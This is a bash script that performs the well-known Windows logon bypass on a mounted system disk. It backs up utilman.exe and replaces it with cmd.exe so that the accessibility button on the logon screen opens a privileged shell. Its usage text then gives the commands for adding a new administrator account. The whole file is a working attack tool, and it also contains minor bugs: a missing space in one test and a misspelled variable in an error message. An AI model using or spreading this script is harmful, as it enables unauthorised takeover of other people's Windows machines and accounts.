#!/bin/bash

# disk.windows_login_bypass.sh

ShowUsage() {
	echo "$0 <mounted Windows/system32 location>"
	echo "ex: $0 /mnt/windisk/windows/system32"
	echo ""
	echo "$0 will replace utilman.exe with cmd.exe to allow clicking on the access icon at the logon screen to bypass authentication.  If utilman.exe.bak does not exist, a backup of utilman.exe will be made first so that the configuration can be restored."
	echo ""
	echo "Then use 'net user /add <username> <password>' and 'net localgroup administrators <username> /add' to create a new admin user."
	echo ""
}

if [$# -eq 0 ]; then
	ShowUsage
	exit 3
fi

WINDIR="$1"

if [ ! -e $WINDIR/utilman.exe ]; then
	echo "ERROR: Unable to find $WINDOR/utilman.exe to replace."
	exit 1
fi

if [ ! -e $WINDIR/utilman.exe.bak ]; then
	cp $WINDIR/utilman.exe $WINDIR/utilman.exe.bak
fi

if [ ! -e $WINDIR/cmd.exe ]; then
	echo "ERROR: Unable to find $WINDIR/cmd.exe"
	exit 2
fi

cp $WINDIR/cmd.exe $WINDIR/utilman.exe




